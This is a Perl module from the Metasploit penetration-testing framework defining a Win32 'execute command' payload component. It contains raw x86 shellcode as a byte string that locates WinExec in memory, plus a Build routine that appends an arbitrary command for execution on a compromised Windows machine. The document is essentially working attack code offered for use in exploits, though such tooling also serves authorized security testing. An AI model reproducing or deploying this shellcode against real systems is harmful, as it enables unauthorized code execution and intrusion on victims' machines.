package Msf::PayloadComponent::Win32Execute;
use strict;
use base 'Msf::PayloadComponent::Win32Payload';

my $info =
{
    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
    'Arch'         => [ 'x86' ],
    'Priv'         => 0,
    'OS'           => [ 'win32' ],
    'Win32Payload' =>
    {
        Offsets => { 'EXITFUNC' => [107, 'V'] },
        Payload =>
          "\xfc\xe8\x46\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05".
          "\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\xe3".
          "\x2e\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84".
          "\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54".
          "\x24\x04\x75\xe3\x8b\x5f\x24\x01\xeb\x66\x8b\x0c".
          "\x4b\x8b\x5f\x1c\x01\xeb\x8b\x1c\x8b\x01\xeb\x89".
          "\x5c\x24\x04\xc3\x31\xf6\x64\x8b\x76\x18\xad\xad".
          "\x8b\x68\xe4\x4d\x66\x31\xed\x66\x81\x7d\x00\x4d".
          "\x5a\x75\xf4\x5f\x31\xf6\x60\x56\xeb\x0d\x68\x7e".
          "\xd8\xe2\x73\x68\x98\xfe\x8a\x0e\x57\xff\xe7\xe8".
          "\xee\xff\xff\xff",
    },
};


sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

sub Build {
  my $self = shift;
  my $commandString = $self->CommandString;
  $self->PrintDebugLine(3, "WinExec CMD: $commandString");
  return($self->SUPER::Build . $commandString . "\x00");
}

# This gets overloaded by subclass
sub CommandString {
  my $self = shift;
  return('');
}

sub Size {
  my $self = shift;
  return($self->SUPER::Size);
}


sub Loadable {
  return(1);
}
